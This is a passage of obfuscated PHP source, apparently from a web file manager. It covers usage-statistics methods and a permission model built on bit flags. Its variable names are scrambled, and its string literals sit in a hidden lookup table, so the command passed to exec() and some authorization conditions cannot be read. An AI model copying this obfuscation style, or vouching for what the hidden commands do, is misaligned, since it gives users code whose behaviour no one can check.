$„òå = array($å¤«æĞ¦[640] => array($å¤«æĞ¦[33] => $å¤«æĞ¦[1832], $å¤«æĞ¦[317] => array($å¤«æĞ¦[239], $å¤«æĞ¦[824], $å¤«æĞ¦[1833], $å¤«æĞ¦[1834])), $å¤«æĞ¦[1835] => array($å¤«æĞ¦[33] => $å¤«æĞ¦[1836], $å¤«æĞ¦[317] => array($å¤«æĞ¦[239], $å¤«æĞ¦[822], $å¤«æĞ¦[1837], $å¤«æĞ¦[1838], $å¤«æĞ¦[1839]))); if (!isset($„òå[$é±İı])) { return !1; } $this->optionType = $„òå[$é±İı][$å¤«æĞ¦[33]]; $this->field = $„òå[$é±İı][$å¤«æĞ¦[317]]; return !0; } public function listData($­Ší•¦µ = false, $ÔšıîêÜ = "\x6d\x6f\x64\151\x66\x79\x54\x69\x6d\x65", $—–¾»˜ = false) { return parent::listData($­Ší•¦µ, $ÔšıîêÜ, $—–¾»˜); } public function trendList($×¥”¼•®) { $¼ùêü‰¡ =& $_SERVER[íû‘ş´]; $êÆİ§ô‹ = $this->listData(); if ($êÆİ§ô‹) { $ØèÚœ£ş = end($êÆİ§ô‹); $õŒëà¡é = date($¼ùêü‰¡[1840], strtotime($¼ùêü‰¡[1841])); if ($ØèÚœ£ş[$¼ùêü‰¡[239]] == $õŒëà¡é) { return $êÆİ§ô‹; } $ç®‘©øƒ = strtotime($ØèÚœ£ş[$¼ùêü‰¡[239]]); } if (!isset($ç®‘©øƒ)) { $‚Ô‚ß·® = $×¥”¼•® == $¼ùêü‰¡[640] ? $¼ùêü‰¡[577] : $¼ùêü‰¡[884]; $ç®‘©øƒ = Model($‚Ô‚ß·®)->min($¼ùêü‰¡[215]); } $ï¾ìË© = $¼ùêü‰¡[1842] . ucfirst($×¥”¼•®); $í€Ê®äÏ = $this->dateList($ç®‘©øƒ); foreach ($í€Ê®äÏ as $õŒëà¡é) { $this->{$ï¾ìË©}($õŒëà¡é); } return $this->listData(); } private function dateList($ç……„ƒğ) { $¥˜­ôÇµ =& $_SERVER[íû‘ş´]; $•’§¶ÊÉ = $ç……„ƒğ; $òÜï°Óš = strtotime($¥˜­ôÇµ[1841]); $Ğâª‹Š‚ = array(); while ($•’§¶ÊÉ <= $òÜï°Óš) { $Ğâª‹Š‚[] = date($¥˜­ôÇµ[1840], $•’§¶ÊÉ); $•’§¶ÊÉ = strtotime($¥˜­ôÇµ[1843], $•’§¶ÊÉ); } return $Ğâª‹Š‚; } public function _recordUser($ãü Ï»Ç = '') { $½÷Ó‡îÔ =& $_SERVER[íû‘ş´]; $¶ı¨â¦Ò = strtotime(date($½÷Ó‡îÔ[1844], strtotime($ãü Ï»Ç))); $‰Í¸ İº = strtotime(date($½÷Ó‡îÔ[1845], strtotime($ãü Ï»Ç))); $³–ºÀÎÜ = array($½÷Ó‡îÔ[215] => array($½÷Ó‡îÔ[1071], $‰Í¸ İº)); $ÖÒ¨È’Š = Model($½÷Ó‡îÔ[577])->where($³–ºÀÎÜ)->count($½÷Ó‡îÔ[1705]); $³–ºÀÎÜ[$½÷Ó‡îÔ[215]] = array($½÷Ó‡îÔ[377], array($¶ı¨â¦Ò, $‰Í¸ İº)); $á¼‡°¬œ = Model($½÷Ó‡îÔ[577])->where($³–ºÀÎÜ)->count($½÷Ó‡îÔ[1705]); $³–ºÀÎÜ[$½÷Ó‡îÔ[33]] = $½÷Ó‡îÔ[1846]; $›–æƒÅ£ = Model($½÷Ó‡îÔ[1847])->where($³–ºÀÎÜ)->count($½÷Ó‡îÔ[1848]); $à±Èƒ¡¹ = array($½÷Ó‡îÔ[239] => $ãü Ï»Ç, $½÷Ó‡îÔ[824] => (int) $ÖÒ¨È’Š, $½÷Ó‡îÔ[1833] => (int) $á¼‡°¬œ, $½÷Ó‡îÔ[1834] => (int) $›–æƒÅ£); return $this->insert($à±Èƒ¡¹); } public function _recordStore($Ä²ıïû = '') { $Ÿ×òáÅ =& $_SERVER[íû‘ş´]; $ÇéŸåşå = strtotime(date($Ÿ×òáÅ[1845], strtotime($Ä²ıïû))); $¦Àæ©ĞÓ = array($Ÿ×òáÅ[215] => array($Ÿ×òáÅ[1071], $ÇéŸåşå)); $ø—¥‰  = Model($Ÿ×òáÅ[521])->where($¦Àæ©ĞÓ)->sum($Ÿ×òáÅ[76]); $¦Àæ©ĞÓ[$Ÿ×òáÅ[462]] = 0; $šÙÂœ»ì = Model($Ÿ×òáÅ[884])->where($¦Àæ©ĞÓ)->sum($Ÿ×òáÅ[76]); $¦Àæ©ĞÓ[$Ÿ×òáÅ[178]] = 1; $ÅùÇîú = Model($Ÿ×òáÅ[884])->where($¦Àæ©ĞÓ)->sum($Ÿ×òáÅ[76]); $¦Àæ©ĞÓ[$Ÿ×òáÅ[178]] = 2; $’Ó¦ˆÃ = Model($Ÿ×òáÅ[884])->where($¦Àæ©ĞÓ)->sum($Ÿ×òáÅ[76]); $ñÙ¹ÌØÑ = array($Ÿ×òáÅ[239] => $Ä²ıïû, $Ÿ×òáÅ[822] => (int) $šÙÂœ»ì, $Ÿ×òáÅ[1837] => (int) $ø—¥‰ , $Ÿ×òáÅ[1838] => (int) $ÅùÇîú, $Ÿ×òáÅ[1839] => (int) $’Ó¦ˆÃ); return $this->insert($ñÙ¹ÌØÑ); } public function trend($ôÆùËœÌ, $™Ä¹œ¡à) { $—„ıŞ˜Æ =& $_SERVER[íû‘ş´]; if (!$this->init($ôÆùËœÌ)) { return !1; } $¨¯ô¾–Œ = $this->trendList($ôÆùËœÌ); if ($¨¯ô¾–Œ && $™Ä¹œ¡à != $—„ıŞ˜Æ[1678]) { $Åçæî‡ = $¨¯ô¾–Œ[0][$—„ıŞ˜Æ[239]]; $´©¯¼ô = $this->validDate($™Ä¹œ¡à, $Åçæî‡); $Û‹å½äÖ = array(); $¿È…¥Ö = array_to_keyvalue($¨¯ô¾–Œ, $—„ıŞ˜Æ[239]); foreach ($´©¯¼ô as $™…ÙŒ§) { if (isset($¿È…¥Ö[$™…ÙŒ§])) { $¤‘ßâà = $¿È…¥Ö[$™…ÙŒ§]; } else { $¤‘ßâà = end($¨¯ô¾–Œ); $¤‘ßâà[$—„ıŞ˜Æ[239]] = $™…ÙŒ§; if ($ôÆùËœÌ == $—„ıŞ˜Æ[640]) { $¤‘ßâà[$—„ıŞ˜Æ[1833]] = $¤‘ßâà[$—„ıŞ˜Æ[1834]] = 0; } } $Û‹å½äÖ[] = $¤‘ßâà; } $¨¯ô¾–Œ = $Û‹å½äÖ; } $øÈ—…àÅ = array($—„ıŞ˜Æ[640] => array($—„ıŞ˜Æ[824] => LNG($—„ıŞ˜Æ[1849]), $—„ıŞ˜Æ[1833] => LNG($—„ıŞ˜Æ[1850]), $—„ıŞ˜Æ[1834] => LNG($—„ıŞ˜Æ[1851])), $—„ıŞ˜Æ[1835] => array($—„ıŞ˜Æ[822] => LNG($—„ıŞ˜Æ[1852]), $—„ıŞ˜Æ[1837] => LNG($—„ıŞ˜Æ[1853]), $—„ıŞ˜Æ[1838] => LNG($—„ıŞ˜Æ[1854]), $—„ıŞ˜Æ[1839] => LNG($—„ıŞ˜Æ[1855]))); $õçù¹Ñ” = array($—„ıŞ˜Æ[640] => $—„ıŞ˜Æ[1856], $—„ıŞ˜Æ[1835] => $—„ıŞ˜Æ[76]); if (empty($¨¯ô¾–Œ)) { $™…ÙŒ§ = date($—„ıŞ˜Æ[1840], strtotime($—„ıŞ˜Æ[1841])); $¥ùŠİºÌ = array($—„ıŞ˜Æ[239] => $™…ÙŒ§); foreach ($øÈ—…àÅ[$ôÆùËœÌ] as $¡¦¤ƒ‚å => $­ï€¾¹”) { $¥ùŠİºÌ[$¡¦¤ƒ‚å] = 0; } $¨¯ô¾–Œ[] = $¥ùŠİºÌ; } $¢ı£š‡ = array(); foreach ($¨¯ô¾–Œ as $­ï€¾¹”) { if ($ôÆùËœÌ == $—„ıŞ˜Æ[1835] && $­ï€¾¹”[$—„ıŞ˜Æ[1837]] > $­ï€¾¹”[$—„ıŞ˜Æ[822]]) { $­ï€¾¹”[$—„ıŞ˜Æ[1837]] = $­ï€¾¹”[$—„ıŞ˜Æ[822]]; } foreach ($øÈ—…àÅ[$ôÆùËœÌ] as $¡¦¤ƒ‚å => $½òÎŒ¡) { $¤‘ßâà = array($—„ıŞ˜Æ[239] => $­ï€¾¹”[$—„ıŞ˜Æ[239]], $—„ıŞ˜Æ[1599] => $½òÎŒ¡); $¤‘ßâà[$õçù¹Ñ”[$ôÆùËœÌ]] = isset($­ï€¾¹”[$¡¦¤ƒ‚å]) ? $­ï€¾¹”[$¡¦¤ƒ‚å] : 0; $¢ı£š‡[] = $¤‘ßâà; } } return $¢ı£š‡; } public function validDate($ÃšËîÍÛ, $™Š’ùÎ) { $£Æ‘Ú£ß =& $_SERVER[íû‘ş´]; $ŠŠİî = date($£Æ‘Ú£ß[1840], strtotime($£Æ‘Ú£ß[1841])); $šíıä = array($ŠŠİî); switch ($ÃšËîÍÛ) { case $£Æ‘Ú£ß[1685]: $¨ûáËÊ« = mktime(0, 0, 0, date($£Æ‘Ú£ß[1857]), date($£Æ‘Ú£ß[1418]) - date($£Æ‘Ú£ß[1481]) + 7 - 7, date($£Æ‘Ú£ß[1858])); $¼ÈóîÈ— = 0; do { $É×·­šû = date($£Æ‘Ú£ß[1840], $¨ûáËÊ« - 3600 * 24 * 7 * $¼ÈóîÈ—); $šíıä[] = $É×·­šû; $¼ÈóîÈ—++; } while ($™Š’ùÎ < $É×·­šû); break; case $£Æ‘Ú£ß[1683]: $¼ÈóîÈ— = 1; do { $®ÎÂƒú = date($£Æ‘Ú£ß[1859], strtotime("\55\x20{$¼ÈóîÈ—}\x20\x6d\157\156\164\150\x73")); $šíıä[] = $®ÎÂƒú; $¼ÈóîÈ—++; } while ($™Š’ùÎ < $®ÎÂƒú); break; case $£Æ‘Ú£ß[1860]: $Ë¯¥Üø = (int) date($£Æ‘Ú£ß[1858], strtotime($™Š’ùÎ)); $äØØü¨ß = (int) date($£Æ‘Ú£ß[1858]); if ($Ë¯¥Üø >= $äØØü¨ß) { break; } for ($Ë¯¥Üø; $Ë¯¥Üø < $äØØü¨ß; $Ë¯¥Üø++) { $šíıä[] = $Ë¯¥Üø . $£Æ‘Ú£ß[1861]; } break; default: break; } if ($™Š’ùÎ > end($šíıä)) { array_pop($šíıä); } sort($šíıä); return $šíıä; } public function listTable($­¯‰¶©¥) { $ñıİÜé = ucfirst($­¯‰¶©¥); return Model($ñıİÜé)->listData(); } public function option($Î·Ë´ì) { $İïŠ¶Êü = $_SERVER[íû‘ş´][1862] . ucfirst($Î·Ë´ì); return $this->{$İïŠ¶Êü}(); } private function optionUser() { $Ê¡Íí =& $_SERVER[íû‘ş´]; $íöïÊ˜Ö = Model($Ê¡Íí[577])->count($Ê¡Íí[1705]); $õ‰ÂƒÆ¸ = Model($Ê¡Íí[577])->where($Ê¡Íí[1863])->count($Ê¡Íí[1705]); $üŸ–® = intval($GLOBALS[$Ê¡Íí[6]][$Ê¡Íí[393]][$Ê¡Íí[1657]]) / 3600; $…öÜ¨“È = strtotime("\55{$üŸ–®}\40\150\x6f\165\x72\163"); $œâèÆğÈ = strtotime(date($Ê¡Íí[1844])); if ($…öÜ¨“È < $œâèÆğÈ) { $…öÜ¨“È = $œâèÆğÈ; } $¨®÷’ßİ = array($Ê¡Íí[1864] => array($Ê¡Íí[1072], $…öÜ¨“È)); $¾“ñù§¤ = (int) Model($Ê¡Íí[577])->where($¨®÷’ßİ)->count($Ê¡Íí[1705]); if (!$¾“ñù§¤) { $¾“ñù§¤ = 1; } $¨®÷’ßİ = array($Ê¡Íí[1864] => array($Ê¡Íí[1072], $œâèÆğÈ)); $ãŒ÷áÙ• = Model($Ê¡Íí[577])->where($¨®÷’ßİ)->count($Ê¡Íí[1705]); return array($Ê¡Íí[817] => (int) $íöïÊ˜Ö, $Ê¡Íí[1865] => (int) ($íöïÊ˜Ö - $õ‰ÂƒÆ¸), $Ê¡Íí[1866] => (int) $õ‰ÂƒÆ¸, $Ê¡Íí[1867] => (int) $ãŒ÷áÙ•, $Ê¡Íí[1868] => $¾“ñù§¤); } private function optionFile() { $Ù´ ©œç =& $_SERVER[íû‘ş´]; $ûßÁç¿Ô = $this->sourceSize(); $«óÁ°Í = $ûßÁç¿Ô[$Ù´ ©œç[76]]; $Ê¶¸ÓĞ = $ûßÁç¿Ô[$Ù´ ©œç[1837]]; $š÷¸É¤Ò = Model($Ù´ ©œç[884])->where(array($Ù´ ©œç[462] => 0))->count($Ù´ ©œç[181]); $éº·ª‘ù = array($Ù´ ©œç[462] => 0, $Ù´ ©œç[215] => array($Ù´ ©œç[1072], strtotime(date($Ù´ ©œç[1844])))); $Öá²”»Ô = Model($Ù´ ©œç[884])->where($éº·ª‘ù)->sum($Ù´ ©œç[76]); $ÄµÉ½´â = Model($Ù´ ©œç[884])->where($éº·ª‘ù)->count($Ù´ ©œç[181]); return array($Ù´ ©œç[822] => $«óÁ°Í, $Ù´ ©œç[1837] => $Ê¶¸ÓĞ, $Ù´ ©œç[1869] => $«óÁ°Í - $Ê¶¸ÓĞ, $Ù´ ©œç[1870] => (int) $Öá²”»Ô, $Ù´ ©œç[824] => (int) $š÷¸É¤Ò, $Ù´ ©œç[1871] => (int) $ÄµÉ½´â); } private function optionAccess() { $ëø«Ş¨À =& $_SERVER[íû‘ş´]; return array($ëø«Ş¨À[817] => $this->typeLogCnt(), $ëø«Ş¨À[107] => $this->typeLogCnt($ëø«Ş¨À[107]), $ëø«Ş¨À[502] => $this->typeLogCnt($ëø«Ş¨À[502]), $ëø«Ş¨À[1872] => $this->typeLogCnt($ëø«Ş¨À[1872]), $ëø«Ş¨À[1873] => $this->typeLogCnt($ëø«Ş¨À[1873]), $ëø«Ş¨À[640] => $this->typeLogCnt($ëø«Ş¨À[12], $ëø«Ş¨À[1848])); } private function typeLogCnt($Áß˜Ñ‡Í = '', $êÔšõğ = "\x69\x64") { $¨ï—†Ğ« =& $_SERVER[íû‘ş´]; $ç×®ì“£ = array($¨ï—†Ğ«[107] => array($¨ï—†Ğ«[1874], $¨ï—†Ğ«[1875]), $¨ï—†Ğ«[502] => array($¨ï—†Ğ«[1876], $¨ï—†Ğ«[1877]), $¨ï—†Ğ«[1872] => array($¨ï—†Ğ«[1878], $¨ï—†Ğ«[1879], $¨ï—†Ğ«[1880]), $¨ï—†Ğ«[1873] => array($¨ï—†Ğ«[1881], $¨ï—†Ğ«[1882]), $¨ï—†Ğ«[1883] => array($¨ï—†Ğ«[1884], $¨ï—†Ğ«[1885], $¨ï—†Ğ«[1886])); $Ù¥…Û¯ = strtotime(date($¨ï—†Ğ«[1844])); $ªµ“£—Á = array($¨ï—†Ğ«[215] => array($¨ï—†Ğ«[1072], $Ù¥…Û¯)); if ($Áß˜Ñ‡Í) { $ªµ“£—Á[$¨ï—†Ğ«[33]] = array($¨ï—†Ğ«[7], $ç×®ì“£[$Áß˜Ñ‡Í]); } $Œ¢ÚŸè° = Model($¨ï—†Ğ«[1847])->where($ªµ“£—Á)->count($êÔšõğ); return (int) $Œ¢ÚŸè°; } private function optionServer() { $ˆÕøÈÍ® =& $_SERVER[íû‘ş´]; $®½’¡È = $this->diskDriver(); $ÜîÒ˜¢ß = KodIO::defaultDriver(); $®ÆÌ¼œë = array($ˆÕøÈÍ®[876] => $ÜîÒ˜¢ß[$ˆÕøÈÍ®[443]]); $óµ§«èê = Model($ˆÕøÈÍ®[521])->where($®ÆÌ¼œë)->sum($ˆÕøÈÍ®[76]); $Åö¿Ô²Ú = explode($ˆÕøÈÍ®[53], $_SERVER[$ˆÕøÈÍ®[144]]); $¼ƒ€°šÏ = $Åö¿Ô²Ú[0]; $ŒÑ¿óÃÚ = $GLOBALS[$ˆÕøÈÍ®[6]][$ˆÕøÈÍ®[21]]; $¤Ò£äÚ‚ = $ŒÑ¿óÃÚ[$ˆÕøÈÍ®[1034]]; if ($¤Ò£äÚ‚ == $ˆÕøÈÍ®[1022]) { $ÑñÏ¿å” = explode($ˆÕøÈÍ®[1340], $ŒÑ¿óÃÚ[$ˆÕøÈÍ®[1033]]); $¤Ò£äÚ‚ = $ÑñÏ¿å”[0]; } if ($¤Ò£äÚ‚ == $ˆÕøÈÍ®[970] || $¤Ò£äÚ‚ == $ˆÕøÈÍ®[863]) { $šğÀß¯Ã = Model()->db()->query($ˆÕøÈÍ®[1887]); $Öõìğ°Ò = $šğÀß¯Ã[0] && isset($šğÀß¯Ã[0][$ˆÕøÈÍ®[1598]]) ? $šğÀß¯Ã[0][$ˆÕøÈÍ®[1598]] : 0; $¤Ò£äÚ‚ = $ˆÕøÈÍ®[1888] . ($Öõìğ°Ò ? $ˆÕøÈÍ®[8] . $Öõìğ°Ò : $ˆÕøÈÍ®[12]); } $”‡ƒÈô = $GLOBALS[$ˆÕøÈÍ®[6]][$ˆÕøÈÍ®[393]][$ˆÕøÈÍ®[886]]; return array($ˆÕøÈÍ®[1889] => $®½’¡È ? $®½’¡È[$ˆÕøÈÍ®[1890]] : 0, $ˆÕøÈÍ®[1891] => $®½’¡È ? $®½’¡È[$ˆÕøÈÍ®[1892]] : 0, $ˆÕøÈÍ®[1893] => (int) $ÜîÒ˜¢ß[$ˆÕøÈÍ®[1890]] * 1024 * 1024 * 1024, $ˆÕøÈÍ®[1894] => (int) $óµ§«èê, $ˆÕøÈÍ®[1895] => ucfirst($¼ƒ€°šÏ), $ˆÕøÈÍ®[1896] => $ˆÕøÈÍ®[1897] . PHP_VERSION, $ˆÕøÈÍ®[1898] => phpBuild64() ? 64 : 32, $ˆÕøÈÍ®[816] => str_replace($ˆÕøÈÍ®[1188], $ˆÕøÈÍ®[1050], $¤Ò£äÚ‚), $ˆÕøÈÍ®[393] => ucfirst($”‡ƒÈô), $ˆÕøÈÍ®[32] => $_SERVER[$ˆÕøÈÍ®[1899]]); } private function diskDriver() { $™äóñ»· =& $_SERVER[íû‘ş´]; $âŒ…ŞÑ³ = $™äóñ»·[8]; $´‡àÂœ = $GLOBALS[$™äóñ»·[6]][$™äóñ»·[1357]] == $™äóñ»·[1358]; if ($´‡àÂœ) { $âŒ…ŞÑ³ = $™äóñ»·[1900]; if (function_exists($™äóñ»·[1901])) { exec($™äóñ»·[1902], $¾æÕœ¾); $âŒ…ŞÑ³ = $¾æÕœ¾[1] . $™äóñ»·[8]; } } if (!file_exists($âŒ…ŞÑ³)) { return; } $¦‰ŞŞİù = @disk_total_space($âŒ…ŞÑ³); $¤›‹òß¦ = $¦‰ŞŞİù - @disk_free_space($âŒ…ŞÑ³); return array($™äóñ»·[1890] => $¦‰ŞŞİù, $™äóñ»·[1892] => $¤›‹òß¦); } public function fileChart($ôüƒçÌñ) { $ôà’Á„Ó =& $_SERVER[íû‘ş´]; if (isset($ôüƒçÌñ[$ôà’Á„Ó[1705]])) { return Model($ôà’Á„Ó[884])->userFileTypeProfile($ôüƒçÌñ[$ôà’Á„Ó[1705]]); } if (isset($ôüƒçÌñ[$ôà’Á„Ó[1903]])) { return Model($ôà’Á„Ó[884])->groupFileTypeProfile($ôüƒçÌñ[$ôà’Á„Ó[1903]]); } $Ö»İŒ„¡ = $this->sourceSize(); $ƒÜÙùÖ£ = array($ôà’Á„Ó[180] => 0, $ôà’Á„Ó[178] => 1); $¦åš‹‚ = Model($ôà’Á„Ó[884])->where($ƒÜÙùÖ£)->sum($ôà’Á„Ó[76]); $ƒÜÙùÖ£[$ôà’Á„Ó[178]] = 2; $°²­™™Õ = Model($ôà’Á„Ó[884])->where($ƒÜÙùÖ£)->sum($ôà’Á„Ó[76]); return array($ôà’Á„Ó[822] => $Ö»İŒ„¡[$ôà’Á„Ó[76]], $ôà’Á„Ó[1837] => $Ö»İŒ„¡[$ôà’Á„Ó[1837]], $ôà’Á„Ó[1838] => (int) $¦åš‹‚, $ôà’Á„Ó[1839] => (int) $°²­™™Õ); } private function sourceSize() { $‘æÄëí¬ =& $_SERVER[íû‘ş´]; $·ç×Î–Œ = Model($‘æÄëí¬[884])->where(array($‘æÄëí¬[462] => 0))->sum($‘æÄëí¬[76]); $·¤©Œ¡‹ = Model($‘æÄëí¬[521])->sum($‘æÄëí¬[76]); if ($·¤©Œ¡‹ > $·ç×Î–Œ) { $·¤©Œ¡‹ = $·ç×Î–Œ; } return array($‘æÄëí¬[76] => (int) $·ç×Î–Œ, $‘æÄëí¬[1837] => (int) $·¤©Œ¡‹); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ñËŒ—ÏÜ =& $_SERVER[íû‘ş´]; $ƒÖó€ò± = array(array($ñËŒ—ÏÜ[471] => LNG($ñËŒ—ÏÜ[1904]), $ñËŒ—ÏÜ[1905] => $ñËŒ—ÏÜ[1906], $ñËŒ—ÏÜ[1907] => 1, $ñËŒ—ÏÜ[1908] => 1, $ñËŒ—ÏÜ[1909] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ñËŒ—ÏÜ[471] => LNG($ñËŒ—ÏÜ[1910]), $ñËŒ—ÏÜ[1905] => $ñËŒ—ÏÜ[1911], $ñËŒ—ÏÜ[1907] => 2, $ñËŒ—ÏÜ[1908] => 1, $ñËŒ—ÏÜ[1909] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ñËŒ—ÏÜ[471] => LNG($ñËŒ—ÏÜ[1912]), $ñËŒ—ÏÜ[1905] => $ñËŒ—ÏÜ[1913], $ñËŒ—ÏÜ[1907] => 3, $ñËŒ—ÏÜ[1908] => 1, $ñËŒ—ÏÜ[1909] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ñËŒ—ÏÜ[471] => LNG($ñËŒ—ÏÜ[1914]), $ñËŒ—ÏÜ[1905] => $ñËŒ—ÏÜ[1915], $ñËŒ—ÏÜ[1907] => 4, $ñËŒ—ÏÜ[1908] => 1, $ñËŒ—ÏÜ[1909] => self::AUTH_SHOW | self::AUTH_VIEW), array($ñËŒ—ÏÜ[471] => LNG($ñËŒ—ÏÜ[1916]), $ñËŒ—ÏÜ[1905] => $ñËŒ—ÏÜ[1917], $ñËŒ—ÏÜ[1907] => 5, $ñËŒ—ÏÜ[1908] => 1, $ñËŒ—ÏÜ[1909] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ñËŒ—ÏÜ[471] => LNG($ñËŒ—ÏÜ[1918]), $ñËŒ—ÏÜ[1905] => $ñËŒ—ÏÜ[1919], $ñËŒ—ÏÜ[1907] => 6, $ñËŒ—ÏÜ[1908] => 1, $ñËŒ—ÏÜ[1909] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ñËŒ—ÏÜ[471] => LNG($ñËŒ—ÏÜ[1920]), $ñËŒ—ÏÜ[1905] => $ñËŒ—ÏÜ[1921], $ñËŒ—ÏÜ[1907] => 7, $ñËŒ—ÏÜ[1908] => 1, $ñËŒ—ÏÜ[1909] => 0)); return $ƒÖó€ò±; } public static function authCheck($§€ÛêÁŒ, $±Í°õ) { $Ñ³û„à° =& $_SERVER[íû‘ş´]; $§€ÛêÁŒ = intval($§€ÛêÁŒ); if ($GLOBALS[$Ñ³û„à°[546]] && $GLOBALS[$Ñ³û„à°[6]][$Ñ³û„à°[1922]]) { return !0; } if ($§€ÛêÁŒ <= 0) { return !1; } if (($§€ÛêÁŒ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($§€ÛêÁŒ & $±Í°õ); } public static function authCheckShow($ƒ§íÕşÔ) { return self::authCheck($ƒ§íÕşÔ, self::AUTH_SHOW); } public static function authCheckView($‹×ï¤£¶) { return self::authCheck($‹×ï¤£¶, self::AUTH_VIEW); } public static function authCheckDownload($›Îòùíü) { return self::authCheck($›Îòùíü, self::AUTH_DOWNLOAD); } public static function authCheckUpload($­¶«„¬ô) { return self::authCheck($­¶«„¬ô, self::AUTH_UPLOAD); } public static function authCheckEdit($­²ûê) { return self::authCheck($­²ûê, self::AUTH_EDIT); } public static function authCheckRemove($ê¹ªÀš«) { return self::authCheck($ê¹ªÀš«, self::AUTH_REMOVE); } public static function authCheckShare($êôÕêÍ) { return self::authCheck($êôÕêÍ, self::AUTH_SHARE); } public static function authCheckComment($ÏçÁ¸û) { return self::authCheck($ÏçÁ¸û, self::AUTH_COMMENT); } public static function authCheckEvent($İ¼˜óôØ) { return self::authCheck($İ¼˜óôØ, self::AUTH_EVENT); } public static function authCheckRoot($ğ¼ûÚ¦) { return self::authCheck($ğ¼ûÚ¦, self::AUTH_ROOT); } public static function authCheckAction($àè®Ó¹, $ËÖéÚò”) { $ßìó‘İ˜ =& $_SERVER[íû‘ş´]; $ÌÆõßÄ¾ = array($ßìó‘İ˜[1923] => self::AUTH_VIEW, $ßìó‘İ˜[1252] => self::AUTH_DOWNLOAD, $ßìó‘İ˜[107] => self::AUTH_UPLOAD, $ßìó‘İ˜[1873] => self::AUTH_EDIT, $ßìó‘İ˜[1872] => self::AUTH_REMOVE, $ßìó‘İ˜[1883] => self::AUTH_SHARE, $ßìó‘İ˜[398] => self::AUTH_COMMENT, $ßìó‘İ˜[1693] => self::AUTH_EVENT, $ßìó‘İ˜[1924] => self::AUTH_ROOT); if (!isset($ÌÆõßÄ¾[$ËÖéÚò”])) { return; } $ĞÀØ¢ø½ = $ÌÆõßÄ¾[$ËÖéÚò”]; $àè®Ó¹ = intval($àè®Ó¹); if ($àè®Ó¹ <= 0) { return !1; } if (($àè®Ó¹ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($àè®Ó¹ & $ĞÀØ¢ø½); } public static function authDisable($ã£¥šª‡, $ŠÖË¨­¡) { if (intval($ã£¥šª‡) <= 0) { return 0; } return intval($ã£¥šª‡) & ~$ŠÖË¨­¡; } public $optionType = "\123\x79\163\164\145\x6d\x2e\x73\x6f\x75\x72\x63\x65\101\165\164\150\x4c\151\163\x74"; public $field = array("\x6e\x61\155\145", "\141\165\164\x68", "\x6c\141\142\145\x6c", "\x64\x69\163\x70\154\141\171", "\x73\171\x73\x74\x65\x6d", "\x73\x6f\x72\164"); public function initData() { $¥ø•½¤Ù = $this->authDefault(); foreach ($¥ø•½¤Ù as $¯›àì„) { $this->add($¯›àì„); } } public function findAuth($½á‡ÑÁÂ, $ÃÃ‰—˜â) { $Ç´³ìÜ =& $_SERVER[íû‘ş´]; $¥£Ù¾ğ = parent::listData(); foreach ($¥£Ù¾ğ as $‘µÌ‚Éˆ) { $ÃçÓì³Å = intval($‘µÌ‚Éˆ[$Ç´³ìÜ[464]]); if ($ÃçÓì³Å <= 0 || $‘µÌ‚Éˆ[$Ç´³ìÜ[1925]] == 0) { continue; } if (($ÃçÓì³Å & $½á‡ÑÁÂ) != $½á‡ÑÁÂ) { continue; } if (($ÃçÓì³Å & $ÃÃ‰—˜â) != 0) { continue; } return $‘µÌ‚Éˆ[$Ç´³ìÜ[443]]; } return !1; } public function findAuthReadOnly() { $¨›Ë ëÍ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $Ï¤¥‡çï = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($¨›Ë ëÍ, $Ï¤¥‡çï); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ÖÓäïÅÊ =& $_SERVER[íû‘ş´]; $Ü­ÖİÄ¿ = parent::listData(); $ü¿•òõ = !1; foreach ($Ü­ÖİÄ¿ as $šì·‹âÚ) { if ($šì·‹âÚ[$ÖÓäïÅÊ[464]] <= 0 || $šì·‹âÚ[$ÖÓäïÅÊ[1925]] == $ÖÓäïÅÊ[212]) { continue; } if (!$ü¿•òõ) { $ü¿•òõ = $šì·‹âÚ; continue; } if ($ü¿•òõ[$ÖÓäïÅÊ[464]] > $šì·‹âÚ[$ÖÓäïÅÊ[464]]) { $ü¿•òõ = $šì·‹âÚ; } } return $ü¿•òõ ? $ü¿•òõ[$ÖÓäïÅÊ[443]] : $ÖÓäïÅÊ[12]; } public function listData($•³î ôÒ = false, $²çà“× = "\x73\x6f\162\164", $¢à×—ıë = false) { return parent::listData($•³î ôÒ, $²çà“×, $¢à×—ıë); } public function update($èó»“ÒÁ, $×›±ë©â) { $ã¬µÏş‰ =& $_SERVER[íû‘ş´]; $”óÃ£§ß = parent::listData($èó»“ÒÁ); $­”Â¼ì = $this->findByName($×›±ë©â[$ã¬µÏş‰[32]]); if (!$”óÃ£§ß || $­”Â¼ì && $­”Â¼ì[$ã¬µÏş‰[443]] != $”óÃ£§ß[$ã¬µÏş‰[443]]) { return !1; } $this->filterAuth($×›±ë©â[$ã¬µÏş‰[464]]); return 